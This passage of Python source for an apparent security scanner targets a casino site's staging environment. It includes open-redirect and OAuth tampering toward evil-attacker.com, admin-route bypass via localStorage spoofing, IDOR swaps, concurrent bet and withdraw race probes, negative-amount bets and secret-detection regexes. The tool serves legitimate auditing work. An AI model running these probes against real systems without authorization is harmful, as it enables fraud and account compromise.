                        "HIGH", f"Sensitive claim name: {k}",
                        fix="Never place secrets or PII in JWT payloads. Use opaque references.",
                        category="jwt_analysis",
                    ))
            if "kid" in header:
                findings.append(finding(
                    "INFO", f"kid present: {header['kid']}",
                    fix="Validate kid strictly. Reject path traversal or unexpected values.",
                    category="jwt_analysis",
                ))
            if "jku" in header or "x5u" in header:
                findings.append(finding(
                    "MEDIUM", "jku/x5u present. Remote key injection surface.",
                    fix="Disable remote key retrieval or whitelist trusted key sources.",
                    category="jwt_analysis",
                ))
            if not signature_b64:
                findings.append(finding(
                    "CRITICAL", "Empty signature section.",
                    fix="Reject tokens with missing signatures.",
                    category="jwt_analysis",
                ))
            # Flatten: one report entry per finding so severity summary counts each
            # (nested list + first-severity previously undercounted / hid HIGH/CRITICAL).
            if findings:
                for fnd in findings:
                    entry = dict(fnd)
                    entry["header"] = header
                    entry["payload_keys"] = list(payload.keys())
                    entry["token_preview"] = token[:40] + "..."
                    self.report["jwt_analysis"].append(tag_finding("jwt_analysis", entry))
            else:
                self.report["jwt_analysis"].append(tag_finding("jwt_analysis", {
                    "severity": "INFO",
                    "detail": "JWT structure parsed; no issues flagged.",
                    "fix": "",
                    "header": header,
                    "payload_keys": list(payload.keys()),
                    "token_preview": token[:40] + "...",
                }))
        except Exception as e:
            self.report["errors"].append(f"JWT structure analysis failed: {e}")


    # ------------------------------------------------------------------
    # RECON phase
    # ------------------------------------------------------------------
    def audit_security_headers(self) -> None:
        self.log.info("Auditing security headers...")
        try:
            resp = self.http_get(self.cfg.target_url)
            headers = {k.lower(): v for k, v in resp.headers.items()}
            raw_sc = resp.headers.get("Set-Cookie")
            if raw_sc:
                self._set_cookies.append(raw_sc)
            try:
                if hasattr(resp.raw, "headers"):
                    for k, v in resp.raw.headers.items():
                        if k.lower() == "set-cookie" and v not in self._set_cookies:
                            self._set_cookies.append(v)
            except Exception:
                pass
            checks = {
                "strict-transport-security": (
                    "MEDIUM", "HSTS missing. Allows downgrade attacks.",
                    "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
                ),
                "content-security-policy": (
                    "MEDIUM", "CSP missing. XSS protection relies solely on input sanitization.",
                    "Add a strict Content-Security-Policy header.",
                ),
                "x-frame-options": (
                    "MEDIUM", "X-Frame-Options missing. Clickjacking possible.",
                    "Add X-Frame-Options: DENY or SAMEORIGIN",
                ),
                "x-content-type-options": (
                    "LOW", "Missing nosniff. MIME-sniffing attacks possible.",
                    "Add X-Content-Type-Options: nosniff",
                ),
                "referrer-policy": (
                    "LOW", "Missing Referrer-Policy. May leak sensitive URLs.",
                    "Add Referrer-Policy: strict-origin-when-cross-origin",
                ),
            }
            for h, (sev, msg, fix) in checks.items():
                if h not in headers:
                    self.report["security_headers"].append(
                        finding(sev, msg, fix=fix, category="security_headers")
                    )
        except Exception as e:
            self.report["errors"].append(f"Header audit error: {e}")

    def run_subfinder(self) -> None:
        if not shutil.which("subfinder"):
            self.log.info("[skip] subfinder not installed.")
            return
        self.log.info("Running Subfinder OSINT...")
        try:
            res = subprocess.run(
                ["subfinder", "-d", "runehall.com", "-silent"],
                capture_output=True, text=True, timeout=120,
            )
            subs = [s.strip() for s in res.stdout.strip().split("\n") if s.strip()]
            self.report["subdomains"] = list(set(subs))
        except Exception as e:
            self.report["errors"].append(f"Subfinder error: {e}")

    def check_rate_limiting(self) -> None:
        self.log.info("Testing Rate Limiting...")
        # Use a dedicated unthrottled session — self.http_get() is harness-throttled
        # (~rate_limit_rps) and would invalidate a burst/rate-limit probe.
        burst_session: Optional[requests.Session] = None
        try:
            burst_session = requests.Session()
            # Reuse UA / Accept headers from the main session when present
            try:
                burst_session.headers.update(dict(self.session.headers))
            except Exception:
                pass
            rate_limited = False
            statuses: List[int] = []
            for _ in range(20):  # capped burst; staging-only via cfg.target_url
                r = burst_session.get(self.cfg.target_url, timeout=2)
                statuses.append(r.status_code)
                if r.status_code == 429:
                    rate_limited = True
                    break
            if rate_limited:
                self.report["rate_limiting"].append(finding(
                    "INFO",
                    f"Rate limiting observed (HTTP 429) within {len(statuses)} unthrottled burst requests.",
                    fix="Confirm thresholds match product expectations.",
                    category="rate_limiting",
                    statuses=statuses[:20],
                ))
            else:
                self.report["rate_limiting"].append(finding(
                    "LOW",
                    "No 429 Rate Limit detected on 20 unthrottled rapid requests to root.",
                    fix="Implement rate limiting at the edge (Cloudflare, AWS WAF, or application layer).",
                    category="rate_limiting",
                    statuses=statuses[:20],
                ))
        except Exception as e:
            self.report["rate_limiting"].append(finding(
                "INFO",
                f"Rate-limit burst inconclusive due to error: {e}",
                fix="Re-run against staging when the host is reachable.",
                category="rate_limiting",
                verdict=Verdict.INCONCLUSIVE.value,
            ))
        finally:
            if burst_session is not None:
                try:
                    burst_session.close()
                except Exception:
                    pass

    def test_http_method_tampering(self) -> None:
        self.log.info("HTTP method tampering check (OPTIONS / TRACE)...")
        try:
            try:
                r = self.http_request("TRACE", self.cfg.target_url, timeout=6)
                if r.status_code == 200 and (
                    "TRACE" in r.text.upper()
                    or r.headers.get("Content-Type", "").startswith("message/http")
                ):
                    self.report["http_method_tampering"].append(finding(
                        "MEDIUM",
                        f"TRACE enabled (HTTP {r.status_code}). Can amplify XST / credential reflection.",
                        fix="Disable TRACE at the edge / origin. Allow only required verbs.",
                        url=self.cfg.target_url, category="http_method_tampering",
                    ))
                elif r.status_code not in (405, 501, 403, 404):
                    self.report["http_method_tampering"].append(finding(
                        "LOW",
                        f"TRACE returned unexpected status {r.status_code}. Confirm it is disabled.",
                        fix="Explicitly reject TRACE.",
                        url=self.cfg.target_url, category="http_method_tampering",
                    ))
            except requests.RequestException:
                pass
            try:
                r = self.http_request("OPTIONS", self.cfg.target_url, timeout=6)
                allow = r.headers.get("Allow") or r.headers.get("Access-Control-Allow-Methods", "")
                if allow:
                    verbs = [v.strip().upper() for v in allow.split(",") if v.strip()]
                    risky = [v for v in verbs if v in ("TRACE", "TRACK", "CONNECT")]
                    if risky:
                        self.report["http_method_tampering"].append(finding(
                            "MEDIUM",
                            f"OPTIONS Allow advertises risky verbs: {risky}. Full Allow={allow}",
                            fix="Remove TRACE/TRACK from allowed methods.",
                            url=self.cfg.target_url, category="http_method_tampering",
                        ))
                    else:
                        self.report["http_method_tampering"].append(finding(
                            "INFO", f"OPTIONS Allow: {allow}",
                            fix="Ensure only required verbs remain.",
                            url=self.cfg.target_url, category="http_method_tampering",
                        ))
            except Exception as e:
                self.report["errors"].append(f"OPTIONS probe error: {e}")
        except Exception as e:
            self.report["errors"].append(f"HTTP method tampering error: {e}")

    def test_auth_cookie_flags(self) -> None:
        self.log.info("Auth cookie-flag audit (HttpOnly/Secure/SameSite)...")
        try:
            r = self.http_get(self.cfg.target_url)
            cookies: List[str] = []
            try:
                for k, v in r.raw.headers.items():
                    if k.lower() == "set-cookie":
                        cookies.append(v)
            except Exception:
                if r.headers.get("Set-Cookie"):
                    cookies.append(r.headers["Set-Cookie"])
            cookies.extend(self._set_cookies)
            if not cookies:
                self.report["auth_cookie_flags"].append(finding(
                    "INFO",
                    "No Set-Cookie headers observed on TARGET_URL root. Cookie-flag audit inconclusive.",
                    fix="Ensure session cookies set HttpOnly; Secure; SameSite=Lax or Strict.",
                    category="auth_cookie_flags",
                ))
                return
            seen: Set[str] = set()
            for sc in cookies:
                name = sc.split("=", 1)[0].strip() if "=" in sc else sc[:40]
                if name in seen:
                    continue
                seen.add(name)
                lower = sc.lower()
                missing = []
                if "httponly" not in lower:
                    missing.append("HttpOnly")
                if "secure" not in lower:
                    missing.append("Secure")
                if "samesite" not in lower:
                    missing.append("SameSite")
                if missing:
                    sev = "HIGH" if ("HttpOnly" in missing or "Secure" in missing) else "MEDIUM"
                    if re.search(r"(session|auth|token|sid|jwt)", name, re.I):
                        sev = "HIGH"
                    self.report["auth_cookie_flags"].append(finding(
                        sev, f"Cookie '{name}' missing flags: {', '.join(missing)}.",
                        fix="Set HttpOnly; Secure; SameSite=Lax (or Strict) on all auth/session cookies.",
                        url=self.cfg.target_url, category="auth_cookie_flags",
                    ))
                else:
                    self.report["auth_cookie_flags"].append(finding(
                        "INFO", f"Cookie '{name}' has HttpOnly + Secure + SameSite.",
                        fix="Good. Prefer SameSite=Strict where UX allows.",
                        url=self.cfg.target_url, category="auth_cookie_flags",
                    ))
        except Exception as e:
            self.report["errors"].append(f"Cookie flag audit error: {e}")

    def test_auth_session_fixation(self) -> None:
        self.log.info("Auth session-fixation check...")
        try:
            sess = requests.Session()
            planted = "aio_fixation_probe_v7_" + hashlib.sha256(b"staging").hexdigest()[:16]
            host = urlparse(self.cfg.target_url).hostname
            sess.cookies.set("session", planted, domain=host)
            sess.cookies.set("sessionid", planted, domain=host)
            r1 = sess.get(self.cfg.target_url, timeout=self.cfg.request_timeout)
            set_cookies: List[str] = []
            try:
                for k, v in r1.raw.headers.items():
                    if k.lower() == "set-cookie":
                        set_cookies.append(v)
            except Exception:
                if r1.headers.get("Set-Cookie"):
                    set_cookies.append(r1.headers["Set-Cookie"])
            returned = sess.cookies.get("session") or sess.cookies.get("sessionid") or ""
            if returned == planted:
                login_paths = ["/api/auth/login", "/api/login", "/login", "/api/session", "/auth/session"]
                rotated = False
                for lp in login_paths:
                    try:
                        rr = sess.post(
                            urljoin(self.cfg.target_url, lp),
                            json={"_probe": "aio-fixation", "email": "fixation-probe@staging.invalid", "password": "invalid"},
                            timeout=6, allow_redirects=False,
                        )
                        new_sess = sess.cookies.get("session") or sess.cookies.get("sessionid") or ""
                        if new_sess and new_sess != planted:
                            rotated = True
                            break
                        try:
                            for k, v in rr.raw.headers.items():
                                if k.lower() == "set-cookie" and "session" in v.lower() and planted not in v:
                                    rotated = True
                        except Exception:
                            pass
                    except Exception:
                        continue
                if not rotated:
                    self.report["auth_session_fixation"].append(finding(
                        "MEDIUM",
                        (
                            "Planted session cookie value was retained after anonymous hit "
                            "(and no login endpoint rotated it). Possible session fixation surface."
                        ),
                        fix="Issue a fresh session id on privilege change / login. Invalidate the pre-login id.",
                        url=self.cfg.target_url, category="auth_session_fixation",
                    ))
                else:
                    self.report["auth_session_fixation"].append(finding(
                        "INFO",
                        "Session id appears rotated around login-ish endpoints — good signal.",
                        fix="Keep rotating session ids on auth state change.",
                        url=self.cfg.target_url, category="auth_session_fixation",
                    ))
            else:
                self.report["auth_session_fixation"].append(finding(
                    "INFO",
                    "Server did not retain the planted session cookie value (or uses a different cookie name).",
                    fix="Continue issuing server-generated session ids; never accept client-chosen ids.",
                    url=self.cfg.target_url, category="auth_session_fixation",
                ))
            self._set_cookies.extend(set_cookies)
        except Exception as e:
            self.report["errors"].append(f"Session fixation check error: {e}")


    # ------------------------------------------------------------------
    # PASSIVE / SPA crawl (Playwright)
    # ------------------------------------------------------------------
    async def run_spa_playwright(self) -> None:
        self.log.info("Launching Playwright SPA crawl...")
        if self.cfg.skip_playwright:
            self.log.info("[skip] AIO_SKIP_PLAYWRIGHT set.")
            return
        if not HAS_PLAYWRIGHT:
            self.log.warning("[skip] playwright package not available.")
            return
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Runehall-MaxAIO/7"
            )
            page = await context.new_page()

            def handle_request(request):
                if request.resource_type in ("xhr", "fetch"):
                    self.intercepted_requests.append({"method": request.method, "url": request.url})
                    auth = request.headers.get("authorization")
                    if auth and auth.lower().startswith("bearer "):
                        self.analyze_jwt(auth.split(" ", 1)[1])
                if "ws" in request.url.lower() or "socket" in request.url.lower():
                    self.ws_endpoints.add(request.url)

            page.on("request", handle_request)
            try:
                await page.goto(self.cfg.target_url, wait_until="networkidle", timeout=45000)
            except Exception as e:
                self.report["errors"].append(f"Navigation failed: {e}")

            await self.scan_js_for_secrets(page)

            try:
                storage = await page.evaluate("""() => ({
                    local: Object.fromEntries(Object.entries(localStorage)),
                    session: Object.fromEntries(Object.entries(sessionStorage))
                })""")
                for stype, data in storage.items():
                    for k in data:
                        if re.search(r"(token|auth|jwt|session|access)", k, re.I):
                            self.report["storage_exposure"].append(finding(
                                "MEDIUM",
                                f"{stype}Storage['{k}'] holds sensitive material.",
                                fix="Prefer httpOnly cookies for session material; avoid localStorage for tokens.",
                                category="storage_exposure",
                            ))
                await page.evaluate("""() => {
                    localStorage.setItem('isAuthenticated', 'true');
                    localStorage.setItem('role', 'admin');
                }""")
                resp = await page.goto(
                    urljoin(self.cfg.target_url, "/admin"),
                    wait_until="domcontentloaded", timeout=15000,
                )
                if resp and resp.status == 200 and "login" not in page.url.lower():
                    self.report["route_bypass"].append(finding(
                        "HIGH",
                        "Bypassed /admin UI guard via LocalStorage spoofing.",
                        fix="Enforce authorization server-side; never trust client-only role flags.",
                        category="route_bypass",
                    ))
            except Exception as e:
                self.report["errors"].append(f"Storage/route error: {e}")

            try:
                resp = self.http_get(
                    self.cfg.target_url,
                    headers={"Origin": "https://evil-attacker.com"},
                    timeout=5,
                )
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                if acao == "https://evil-attacker.com" and acac.lower() == "true":
                    self.report["cors_findings"].append(finding(
                        "HIGH", "CORS reflects arbitrary origin with credentials.",
                        fix="Allowlist trusted origins; never reflect Origin when credentials are allowed.",
                        category="cors_findings",
                    ))
                elif acao == "*":
                    self.report["cors_findings"].append(finding(
                        "MEDIUM", "CORS wildcard ACAO.",
                        fix="Avoid ACAO:* for credentialed APIs.",
                        category="cors_findings",
                    ))
            except Exception as e:
                self.report["errors"].append(f"CORS probe error: {e}")

            try:
                polluted = await page.evaluate("""() => {
                    try {
                        const obj = {};
                        Object.assign(obj, JSON.parse('{"__proto__": {"polluted": true}}'));
                        return ({}).polluted === true || obj.polluted === true;
                    } catch(e) { return false; }
                }""")
                if polluted:
                    self.report["prototype_pollution"].append(finding(
                        "HIGH", "Prototype pollution via __proto__ assignment succeeded.",
                        fix="Use Object.create(null) / Map; freeze Object.prototype; sanitize merges.",
                        category="prototype_pollution",
                    ))
            except Exception as e:
                self.report["errors"].append(f"Prototype pollution probe error: {e}")

            try:
                await page.evaluate("""() => {
                    window.__crossOriginAccepted = false;
                    window.addEventListener('message', (e) => {
                        if (e.origin !== window.location.origin) window.__crossOriginAccepted = true;
                    });
                    window.postMessage({type: 'probe'}, '*');
                }""")
                accepted = await page.evaluate("() => window.__crossOriginAccepted")
                if accepted:
                    self.report["postmessage_issues"].append(finding(
                        "MEDIUM", "Cross-origin postMessage accepted without origin check.",
                        fix="Validate event.origin against an allowlist before handling messages.",
                        category="postmessage_issues",
                    ))
            except Exception as e:
                self.report["errors"].append(f"postMessage probe error: {e}")

            for ws_url in list(self.ws_endpoints)[:5]:
                try:
                    # Only connect to staging.runehall.com WS endpoints
                    if "staging.runehall.com" not in ws_url and "runehall.com" not in ws_url:
                        continue
                    connected = await page.evaluate(
                        """async (wsUrl) => {
                            try {
                                const s = new WebSocket(wsUrl);
                                await new Promise((res, rej) => {
                                    s.onopen = () => res(true);
                                    s.onerror = () => rej(false);
                                    setTimeout(() => rej(false), 4000);
                                });
                                s.close();
                                return true;
                            } catch(e) { return false; }
                        }""",
                        ws_url,
                    )
                    if connected:
                        self.report["websocket_findings"].append(finding(
                            "HIGH",
                            f"Unauthenticated WebSocket handshake accepted: {ws_url}",
                            fix="Require auth on WS upgrade; reject anonymous sockets for privileged channels.",
                            url=ws_url, category="websocket_findings",
                        ))
                except Exception:
                    pass

            for path in ("/graphql", "/api/graphql", "/v1/graphql"):
                try:
                    r = self.http_post(
                        urljoin(self.cfg.target_url, path),
                        json_body={"query": "{ __schema { types { name } } }"},
                        timeout=6,
                    )
                    if r.status_code == 200 and "__schema" in r.text:
                        self.report["graphql_findings"].append(finding(
                            "MEDIUM", f"GraphQL introspection enabled at {path}",
                            fix="Disable introspection in non-dev environments.",
                            url=urljoin(self.cfg.target_url, path), category="graphql_findings",
                        ))
                        break
                except Exception:
                    continue

            endpoints = set()
            for req in self.intercepted_requests:
                parsed = urlparse(req["url"])
                if "/api/" in parsed.path or parsed.path.startswith("/v") or "graphql" in parsed.path:
                    endpoints.add(f"{req['method']} {parsed.path}")
            self.report["api_endpoints"] = sorted(list(endpoints))
            await browser.close()

    async def scan_js_for_secrets(self, page) -> None:
        self.log.info("Scanning JS Bundles for Hardcoded Secrets...")
        try:
            js_urls = await page.evaluate(
                "Array.from(document.scripts).map(s => s.src).filter(s => s)"
            )
            patterns = {
                "AWS Access Key": r"(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}",
                "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
                "Stripe Live Key": r"sk_live_[0-9a-zA-Z]{24}",
                "Firebase URL": r"https://[a-z0-9\-]+\.firebaseio\.com",
                "Private Key": r"-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----",
            }
            for url in js_urls[:15]:
                if not url:
                    continue
                # Only fetch JS from staging / runehall
                host = urlparse(url).hostname or ""
                if host and "runehall.com" not in host:
                    continue
                try:
                    r = self.http_get(url, timeout=6)
                    self.js_bundle_texts[url] = r.text
                    for name, pat in patterns.items():
                        if re.search(pat, r.text):
                            self.report["js_secrets"].append(finding(
                                "CRITICAL",
                                f"Potential {name} found in {url}",
                                fix="Remove secrets from client-side code. Use environment variables and server-side proxies.",
                                url=url, category="js_secrets",
                            ))
                except Exception:
                    continue
        except Exception as e:
            self.report["errors"].append(f"JS secret scan error: {e}")

    # ------------------------------------------------------------------
    # ACTIVE-SAFE probes
    # ------------------------------------------------------------------
    def test_open_redirect(self) -> None:
        self.log.info("Testing for Open Redirects...")
        params = ["url", "redirect", "next", "return", "dest", "target", "r", "u", "continue", "redirect_uri"]
        for req in self.intercepted_requests:
            if req["method"] != "GET":
                continue
            parsed = urlparse(req["url"])
            if "runehall.com" not in (parsed.hostname or ""):
                continue
            query = parse_qs(parsed.query)
            for param in params:
                if param not in query:
                    continue
                payload = "https://evil-attacker.com"
                new_query = query.copy()
                new_query[param] = [payload]
                tampered_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                    urlencode(new_query, doseq=True), parsed.fragment,
                ))
                try:
                    res = self.http_get(tampered_url, allow_redirects=False, timeout=5)
                    loc = res.headers.get("Location", "")
                    if res.status_code in (301, 302, 303, 307, 308) and "evil-attacker.com" in loc:
                        self.report["open_redirects"].append(finding(
                            "HIGH", f"Open redirect via parameter '{param}'.",
                            fix="Validate redirect targets against an allowlist. Never use raw user input.",
                            url=tampered_url, category="open_redirects",
                        ))
                except Exception:
                    pass

    def test_reflected_xss_candidates(self) -> None:
        self.log.info("Reflected-param XSS candidate probe...")
        marker = "aioXssCand7f3a"
        seen: Set[Tuple[str, str]] = set()
        for req in self.intercepted_requests:
            if req["method"] != "GET":
                continue
            parsed = urlparse(req["url"])
            if "runehall.com" not in (parsed.hostname or ""):
                continue
            query = parse_qs(parsed.query)
            if not query:
                continue
            for param in list(query.keys())[:8]:
                key = (parsed.path, param)
                if key in seen:
                    continue
                seen.add(key)
                new_query = {k: v[:] for k, v in query.items()}
                new_query[param] = [marker]
                tampered = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                    urlencode(new_query, doseq=True), parsed.fragment,
                ))
                try:
                    r = self.http_get(tampered, timeout=6, headers={"Accept": "text/html,*/*"})
                    ctype = r.headers.get("content-type", "")
                    if marker in r.text and ctype.startswith(("text/html", "application/json", "text/")):
                        self.report["reflected_xss_candidates"].append(finding(
                            "MEDIUM",
                            (
                                f"CANDIDATE: query param '{param}' reflected in response body. "
                                "Not a confirmed XSS — manual DOM review required."
                            ),
                            fix="Encode output contextually. Prefer CSP with nonces and avoid innerHTML of user input.",
                            url=tampered, category="reflected_xss_candidates",
                        ))
                except Exception:
                    pass
                if len(seen) >= 25:
                    return

    def test_ssrf_param_candidates(self) -> None:
        self.log.info("SSRF-parameter heuristic scan (candidates only, no callbacks)...")
        ssrf_names = {
            "url", "uri", "webhook", "callback", "callback_url", "hook", "target",
            "fetch", "proxy", "redirect_url", "image_url", "avatar_url", "link",
            "endpoint", "dest", "destination", "next_url",
        }
        seen: Set[Tuple[str, str]] = set()
        for req in self.intercepted_requests:
            parsed = urlparse(req["url"])
            if "runehall.com" not in (parsed.hostname or ""):
                continue
            query = parse_qs(parsed.query)
            for param in query:
                pl = param.lower()
                if pl in ssrf_names or any(
                    pl.endswith("_" + n) or pl.endswith(n) for n in ("url", "uri", "webhook", "callback")
                ):
                    key = (parsed.path, param)
                    if key in seen:
                        continue
                    seen.add(key)
                    self.report["ssrf_param_candidates"].append(finding(
                        "MEDIUM",
                        (
                            f"CANDIDATE: parameter '{param}' on {req['method']} {parsed.path} looks SSRF-prone. "
                            "No callback was made — review server-side fetch/allowlist manually."
                        ),
                        fix="Allowlist outbound destinations. Block link-local, metadata IPs, and private ranges.",
                        url=f"{req['method']} {parsed.path}?{param}=...",
                        category="ssrf_param_candidates",
                    ))

    def test_auth_oauth_redirect(self) -> None:
        self.log.info("Auth OAuth / redirect_uri misconfig check...")
        oauth_params = ["redirect_uri", "returnTo", "return_to", "callback", "callback_url", "next", "continue"]
        oauth_paths = [
            "/oauth/callback", "/oauth/authorize", "/auth/callback", "/api/auth/callback",
            "/api/oauth/authorize", "/login/oauth", "/api/auth/login",
        ]
        for path in oauth_paths:
            url = urljoin(self.cfg.target_url, path)
            for param in ("redirect_uri", "next", "returnTo"):
                payload = "https://evil-attacker.com/oauth-sink"
                try:
                    q = urlencode({param: payload, "client_id": "aio-probe", "response_type": "code"})
                    tampered = f"{url}?{q}"
                    res = self.http_get(tampered, allow_redirects=False, timeout=5)
                    loc = res.headers.get("Location", "")
                    if res.status_code in (301, 302, 303, 307, 308) and "evil-attacker.com" in loc:
                        self.report["auth_oauth_redirect"].append(finding(
                            "CRITICAL",
                            f"OAuth-ish open redirect via '{param}' on {path}.",
                            fix="Allowlist redirect_uri per client_id. Never reflect arbitrary URLs.",
                            url=tampered, category="auth_oauth_redirect",
                        ))
                except Exception:
                    pass

        for req in self.intercepted_requests:
            if req["method"] != "GET":
                continue
            parsed = urlparse(req["url"])
            if "runehall.com" not in (parsed.hostname or ""):
                continue
            query = parse_qs(parsed.query)
            for param in oauth_params:
                if param not in query:
                    continue
                payload = "https://evil-attacker.com/oauth-sink"
                new_query = {k: v[:] for k, v in query.items()}
                new_query[param] = [payload]
                tampered_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                    urlencode(new_query, doseq=True), parsed.fragment,
                ))
                try:
                    res = self.http_get(tampered_url, allow_redirects=False, timeout=5)
                    loc = res.headers.get("Location", "")
                    if res.status_code in (301, 302, 303, 307, 308) and "evil-attacker.com" in loc:
                        self.report["auth_oauth_redirect"].append(finding(
                            "CRITICAL",
                            f"Open redirect via OAuth-related param '{param}' on intercepted {parsed.path}.",
                            fix="Allowlist redirect targets. Bind redirect_uri to the registered OAuth client.",
                            url=tampered_url, category="auth_oauth_redirect",
                        ))
                except Exception:
                    pass

        if not self.report["auth_oauth_redirect"]:
            self.report["auth_oauth_redirect"].append(finding(
                "INFO",
                "No OAuth open-redirect confirmed on probed paths/params.",
                fix="Keep an explicit redirect_uri allowlist per OAuth client.",
                category="auth_oauth_redirect",
            ))

    def test_bola(self) -> None:
        if not self.jwt_configured("A") or not self.jwt_configured("B"):
            self.log.info("BOLA/IDOR skipped — JWT placeholders not filled.")
            return
        self.log.info("Testing BOLA / IDOR with dual JWTs...")
        for req in self.intercepted_requests:
            if req["method"] not in ("GET", "PUT", "DELETE", "PATCH"):
                continue
            url = req["url"]
            if "runehall.com" not in url:
                continue
            for pat in [r"(/)(\d+)(/|$|\?)", r"([?&]id=)(\d+)", r"([?&]userId=)(\d+)"]:
                match = re.search(pat, url)
                if not match:
                    continue
                current_id = match.group(2)
                try:
                    test_id = str(int(current_id) + 1)
                except ValueError:
                    continue
                tampered_url = url.replace(current_id, test_id, 1)
                try:
                    res_b = self.http_request(
                        req["method"], tampered_url,
                        headers={"Authorization": f"Bearer {self.cfg.user_b_jwt}"},
                        allow_redirects=False, timeout=8,
                    )
                    res_a = self.http_request(
                        req["method"], tampered_url,
                        headers={"Authorization": f"Bearer {self.cfg.user_a_jwt}"},
                        allow_redirects=False, timeout=8,
                    )
                    if (
                        res_a.status_code == 200 and res_b.status_code == 200
                        and res_a.text == res_b.text and len(res_a.text) > 20
                    ):
                        self.report["idor_bola"].append(finding(
                            "CRITICAL",
                            "User A received User B's exact payload.",
                            fix="Enforce object-level authorization. Verify the requesting user owns the resource.",
                            url=tampered_url, category="idor_bola",
                            method=req["method"], evidence="Identical payload for both JWTs.",
                        ))
                except requests.RequestException:
                    pass

    def run_nuclei(self) -> None:
        if not shutil.which("nuclei"):
            self.log.info("[skip] nuclei not installed.")
            return
        self.log.info("Running Nuclei...")
        out_path = "nuclei_out.json"
        # Drop any prior output so a failed/empty run cannot re-ingest stale findings
        try:
            if os.path.exists(out_path):
                os.remove(out_path)
        except OSError as e:
            self.log.warning("Could not clear prior %s: %s", out_path, e)
        cmd = [
            "nuclei", "-u", self.cfg.target_url,
            "-t", "http/exposures/", "-t", "http/misconfiguration/",
            "-t", "http/cves/", "-severity", "critical,high,medium", "-rl", "50",
            "-jsonl", "-o", out_path, "-silent",
        ]
        try:
            completed = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if completed.returncode != 0:
                self.log.warning(
                    "Nuclei exited %s; ingesting only fresh output if present.",
                    completed.returncode,
                )
            if os.path.exists(out_path):
                with open(out_path) as f:
                    for line in f:
                        try:
                            data = json.loads(line)
                            self.report["nuclei_findings"].append(tag_finding("nuclei_findings", {
                                "severity": data.get("info", {}).get("severity", "unknown").upper(),
                                "name": data.get("info", {}).get("name", "unnamed"),
                                "matched_at": data.get("matched-at", "unknown"),
                                "detail": data.get("info", {}).get("name", "unnamed"),
                                "fix": "Review and remediate the Nuclei template match.",
                            }))
                        except json.JSONDecodeError:
                            continue
        except Exception as e:
            self.report["errors"].append(f"Nuclei error: {e}")


    # ------------------------------------------------------------------
    # STATEFUL-gated modules
    # ------------------------------------------------------------------
    def test_casino_race(self) -> None:
        self.log.info("Casino race-condition probe...")
        if not self.cfg.run_stateful:
            self.log.info("[skip] RUN_STATEFUL=False — race probe not fired.")
            return
        if not self.jwt_configured("A"):
            self.log.info("[skip] USER_A_JWT placeholder — race probe not fired.")
            return
        targets = []
        for key in ("BET_ENDPOINT", "WITHDRAW_ENDPOINT"):
            path = self.cfg.casino_endpoints().get(key, "").strip()
            if path:
                targets.append((key, path))
        if not targets:
            self.log.info("[skip] No BET/WITHDRAW endpoints configured.")
            return

        concurrent = min(8, self.cfg.max_concurrency)
        tiny_body = {"amount": 0.01, "currency": "USD", "_probe": "aio-race-v7"}
        for key, path in targets:
            url = urljoin(self.cfg.target_url, path)
            self.log.info("Firing %s concurrent POSTs to %s (%s)...", concurrent, key, path)
            statuses: List[Any] = []

            def _one() -> Any:
                try:
                    r = self.http_post(url, headers=self.auth_headers(), json_body=tiny_body, timeout=10)
                    return r.status_code
                except Exception as e:
                    return f"err:{e}"

            try:
                with ThreadPoolExecutor(max_workers=concurrent) as pool:
                    futures = [pool.submit(_one) for _ in range(concurrent)]
                    for fut in as_completed(futures):
                        statuses.append(fut.result())
            except Exception as e:
                self.report["errors"].append(f"Casino race executor error ({key}): {e}")
                continue

            successes = [s for s in statuses if isinstance(s, int) and 200 <= s < 300]
            self.log.info("%s: %s/%s success responses %s", key, len(successes), concurrent, statuses)
            if len(successes) > 1:
                self.report["casino_race"].append(finding(
                    "CRITICAL",
                    (
                        f"{key} accepted {len(successes)} of {concurrent} concurrent identical requests. "
                        "Possible TOCTOU / double-spend if balance was debited more than once."
                    ),
                    fix="Serialize balance mutations (DB row lock / idempotency key / single-flight). Reject duplicate in-flight bets.",
                    url=url, category="casino_race", statuses=statuses, verdict=Verdict.FAIL.value,
                ))
                self.report["race_conditions"].append(finding(
                    "CRITICAL",
                    f"Casino race on {key}: {len(successes)} concurrent successes.",
                    fix="Use transactional locks or idempotency keys around balance-affecting endpoints.",
                    url=url, category="race_conditions",
                ))
            elif len(successes) == 1:
                self.report["casino_race"].append(finding(
                    "INFO",
                    f"{key}: only 1/{concurrent} succeeded — server appears to serialize or reject duplicates.",
                    fix="Good signal. Confirm with staging balance audit that only one debit occurred.",
                    url=url, category="casino_race", statuses=statuses, verdict=Verdict.PASS.value,
                ))
            else:
                self.report["casino_race"].append(finding(
                    "INFO",
                    f"{key}: 0 successes (statuses={statuses}). Endpoint may require a richer body or auth.",
                    fix="Fill a realistic staging bet body if you need a conclusive race test.",
                    url=url, category="casino_race", statuses=statuses, verdict=Verdict.INCONCLUSIVE.value,
                ))

    def test_casino_amount_validation(self) -> None:
        self.log.info("Casino amount validation probe...")
        if not self.cfg.run_stateful:
            self.log.info("[skip] RUN_STATEFUL=False — amount probe not fired (read-only note recorded).")
            self.report["casino_amount_validation"].append(finding(
                "INFO",
                "Amount validation probe skipped (RUN_STATEFUL=False). Enable to send negative/zero/overflow bets on staging.",
                fix="Server must reject amount <= 0 and values exceeding MaxSafeInteger / balance.",
                category="casino_amount_validation", verdict=Verdict.INCONCLUSIVE.value,
            ))
            return
        if not self.jwt_configured("A"):
            self.log.info("[skip] USER_A_JWT placeholder.")
            return
        path = self.cfg.bet_endpoint or self.cfg.withdraw_endpoint
        if not path:
            self.log.info("[skip] No BET/WITHDRAW endpoint configured.")
            return
        url = urljoin(self.cfg.target_url, path)
        payloads = [
            ("negative", {"amount": -1, "currency": "USD", "_probe": "aio-amt-neg"}),
